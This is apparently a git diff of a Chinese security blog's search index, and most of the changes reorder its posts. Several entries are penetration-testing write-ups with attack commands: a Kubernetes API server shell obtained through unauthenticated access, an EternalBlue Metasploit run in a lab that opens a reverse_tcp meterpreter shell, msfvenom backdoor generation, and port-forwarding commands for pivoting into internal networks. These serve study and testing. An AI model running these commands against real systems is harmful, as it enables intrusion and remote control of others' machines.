@@ -1,23 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
-    <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
-<h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
-<p><img data-src="Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HP Data Protector漏洞利用记录</title>
     <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
@@ -40,6 +23,23 @@
       <tags>
         <tag>漏洞</tag>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
+    <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
+<h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
+<p><img data-src="Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -69,6 +69,36 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Metasploit利用Eternalblue-Doublepulsar</title>
+    <url>/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文无任何技术水平，仅用来记录一次<code>Eternalblue-Doublepulsar</code>利用过程，作笔记使用。</p>
+<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次实验在虚拟机中进行，攻击机与靶机位于同一局域网内。<br>攻击机：<code>Kali Linux</code>（IP：<code>192.168.200.130</code>）<br>靶机：<code>Windows 7 x64</code>（IP：<code>192.168.200.142</code>）</p>
+<a id="more"></a>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载<code>Eternalblue-Doublepulsar</code>到<code>/root</code>目录，这里最好不要改，因为工具里面配置的默认目录就是这个目录，改了的话相应的也要在<code>msf</code>里面改<code>DOUBLEPULSARPATH</code>、<code>ETERNALBLUEPATH</code>这两个变量</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br></pre></td></tr></table></figure>
+<p>复制<code>eternalblue_doublepulsar.rb</code>到<code>/usr/share/metasploit-framework/modules/exploits/windows/smb/</code>目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br></pre></td></tr></table></figure>
+<p>安装依赖</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br></pre></td></tr></table></figure>
+<p>创建<code>.wine/drive_c</code>目录，这里不创建的话后面<code>msf</code>利用漏洞时会出现目录不存在错误</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /root/.wine/drive_c</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动<code>msfconsole</code>，如果你已经启动了，可以使用<code>reload_all</code>重新加载<code>msf</code>模块来引入刚下载的模块</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>使用漏洞利用模块，值得注意的一点是需要设置<code>PROCESSINJECT</code>这一变量值，在本次实验中，使用默认值并没有成功，修改<code>PROCESSINJECT</code>为<code>explorer.exe</code>成功拿到<code>meterpreter shell</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-14.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-34.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-40.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-47.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://laucyun.com/a6cb3c752b0fc10f0a9eeef01f7a5f76.html">通过Metasploit实现对MS17-010漏洞的利用</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -108,36 +138,6 @@
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit利用Eternalblue-Doublepulsar</title>
-    <url>/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文无任何技术水平，仅用来记录一次<code>Eternalblue-Doublepulsar</code>利用过程，作笔记使用。</p>
-<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次实验在虚拟机中进行，攻击机与靶机位于同一局域网内。<br>攻击机：<code>Kali Linux</code>（IP：<code>192.168.200.130</code>）<br>靶机：<code>Windows 7 x64</code>（IP：<code>192.168.200.142</code>）</p>
-<a id="more"></a>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载<code>Eternalblue-Doublepulsar</code>到<code>/root</code>目录，这里最好不要改，因为工具里面配置的默认目录就是这个目录，改了的话相应的也要在<code>msf</code>里面改<code>DOUBLEPULSARPATH</code>、<code>ETERNALBLUEPATH</code>这两个变量</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br></pre></td></tr></table></figure>
-<p>复制<code>eternalblue_doublepulsar.rb</code>到<code>/usr/share/metasploit-framework/modules/exploits/windows/smb/</code>目录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br></pre></td></tr></table></figure>
-<p>安装依赖</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br></pre></td></tr></table></figure>
-<p>创建<code>.wine/drive_c</code>目录，这里不创建的话后面<code>msf</code>利用漏洞时会出现目录不存在错误</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /root/.wine/drive_c</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动<code>msfconsole</code>，如果你已经启动了，可以使用<code>reload_all</code>重新加载<code>msf</code>模块来引入刚下载的模块</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>使用漏洞利用模块，值得注意的一点是需要设置<code>PROCESSINJECT</code>这一变量值，在本次实验中，使用默认值并没有成功，修改<code>PROCESSINJECT</code>为<code>explorer.exe</code>成功拿到<code>meterpreter shell</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-14.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-34.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-40.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-47.png"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://laucyun.com/a6cb3c752b0fc10f0a9eeef01f7a5f76.html">通过Metasploit实现对MS17-010漏洞的利用</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -327,6 +327,25 @@
       </tags>
   </entry>
   <entry>
+    <title>VMware虚拟机磁盘空间压缩</title>
+    <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
+    <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
+<p>执行后等待进度条结束即可：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
+<a id="more"></a>
+
+<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
+<p>压缩后占用：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
+]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+      <tags>
+        <tag>折腾</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo建站笔记</title>
     <url>/2019/07/08/hexo-blog/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因一次意外，hexo博客源码被删除干净，抽空重新配置hexo并重新写了之前的文章，这里把配置hexo各项功能作个记录。</p>
@@ -435,25 +454,6 @@
       </tags>
   </entry>
   <entry>
-    <title>VMware虚拟机磁盘空间压缩</title>
-    <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
-    <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
-<p>执行后等待进度条结束即可：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
-<a id="more"></a>
-
-<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
-<p>压缩后占用：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
-]]></content>
-      <categories>
-        <category>折腾</category>
-      </categories>
-      <tags>
-        <tag>折腾</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kali iptables 配置自启动加载</title>
     <url>/2020/08/21/kali-iptables-%E9%85%8D%E7%BD%AE%E8%87%AA%E5%90%AF%E5%8A%A8%E5%8A%A0%E8%BD%BD/</url>
     <content><![CDATA[<h3 id="创建启动配置文件"><a href="#创建启动配置文件" class="headerlink" title="创建启动配置文件"></a>创建启动配置文件</h3><p>编辑创建以下文件：</p>
@@ -482,21 +482,6 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>同步GitHub Page博客到Gitee</title>
-    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
-    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
-<a id="more"></a>
-<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
-<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
-]]></content>
-      <categories>
-        <category>折腾</category>
-      </categories>
-      <tags>
-        <tag>折腾</tag>
       </tags>
   </entry>
   <entry>
@@ -556,6 +541,21 @@
       </tags>
   </entry>
   <entry>
+    <title>同步GitHub Page博客到Gitee</title>
+    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
+    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
+<a id="more"></a>
+<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
+<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img data-src="%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
+]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+      <tags>
+        <tag>折腾</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>当SQL注入遇到诡异的编码问题</title>
     <url>/2019/09/12/%E5%BD%93SQL%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E8%AF%A1%E5%BC%82%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<p>分享一个特殊的SQL注入案例，某处SQL注入因WEB系统数据库连接编码与实际的数据库编码不一致，并且数据库表字段名使用了中文的字段名，导致通过正常手段无法获取到数据库数据，文章已在Freebuf发布。<a href="https://www.freebuf.com/articles/web/213142.html">Freebuf原文</a></p>
@@ -569,27 +569,87 @@
       </tags>
   </entry>
   <entry>
-    <title>记一次Windows提权过程</title>
-    <url>/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
-<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>
-
-<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
-
+    <title>浅谈代理隧道的几种应用场景</title>
+    <url>/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
+    <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
+<h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
 <a id="more"></a>
+<h4 id="2-1-简单端口转发"><a href="#2-1-简单端口转发" class="headerlink" title="2.1 简单端口转发"></a>2.1 简单端口转发</h4><p>域C可访问域B，不可访问域A。<code>172.16.1.1</code>把<code>172.16.2.1</code>的SSH服务<code>22</code>端口转发到自己的<code>8022</code>端口，<code>192.168.1.2</code>可通过访问<code>172.16.1.1:8022</code>端口连接<code>172.16.2.1</code>的SSH服务。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-15-56-37.png"><br>实现方法：</p>
+<ul>
+<li>Windows：<code>netsh int portproxy</code>，如:<code>netsh interface portproxy add v4tov4 listenport=8022 connectport=22 connectaddress=172.16.2.1</code></li>
+<li>Linux：<code>socat、iptables DNAT+SNAT</code>，如：<code>socat tcp-l:8022,reuseaddr,fork tcp:172.16.2.1:22,reuseaddr</code></li>
+<li>lcx</li>
+<li>ew</li>
+<li>其它</li>
+</ul>
+<h4 id="2-2-反弹端口转发"><a href="#2-2-反弹端口转发" class="headerlink" title="2.2 反弹端口转发"></a>2.2 反弹端口转发</h4><p>局域网B内PC1无法直接访问局域网A内机器，把局域网A服务器172.16.2.1:22端口转发到公网服务器1.1.1.1:8022端口，这样可以让PC1通过公网访问该机器。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-00-25.png"><br>实现方法：</p>
+<ul>
+<li>SSH远程转发</li>
+<li>ngrok</li>
+<li>nps</li>
+<li>shootback</li>
+</ul>
+<h3 id="三、socks转发"><a href="#三、socks转发" class="headerlink" title="三、socks转发"></a>三、socks转发</h3><p>socks转发与端口转发类似，但是效果不同，端口转发效果只能访问单个端口的服务，socks转发可以访问整个目标网络。与VP*N效果类似，但是不能转发传输层以下的包。</p>
+<h4 id="3-1-简单socks转发"><a href="#3-1-简单socks转发" class="headerlink" title="3.1 简单socks转发"></a>3.1 简单socks转发</h4><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-01-24.png"><br>实现方法：</p>
+<ul>
+<li>小飞机</li>
+<li>ew</li>
+<li>nps</li>
+<li>reGeorg(webshell)</li>
+<li>冰歇(webshell)<h4 id="3-2-反弹socks转发"><a href="#3-2-反弹socks转发" class="headerlink" title="3.2 反弹socks转发"></a>3.2 反弹socks转发</h4>socks服务器位于内网，外部机器通过公网访问反弹的socks端口来访问内网。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-02-20.png"><br>实现方法：</li>
+<li>小飞机+反弹端口</li>
+<li>ew</li>
+<li>nps</li>
+<li>其它socks服务+反弹端口</li>
+</ul>
+<h3 id="四、SSH代理隧道"><a href="#四、SSH代理隧道" class="headerlink" title="四、SSH代理隧道"></a>四、SSH代理隧道</h3><h4 id="4-1-使用SSH动态端口转发"><a href="#4-1-使用SSH动态端口转发" class="headerlink" title="4.1 使用SSH动态端口转发"></a>4.1 使用SSH动态端口转发</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>使用工作PC访问公司内网服务器，登陆内网网站、登陆内网服务器。</p>
+<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接123.123.123.123:2222登陆到内网服务器A，其它内网端口未做映射<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-03-35.png"></p>
+<h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
+<li>工作机使用Xshell新建连接，并填好连接信息，然后打开隧道选项<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-10.png"></li>
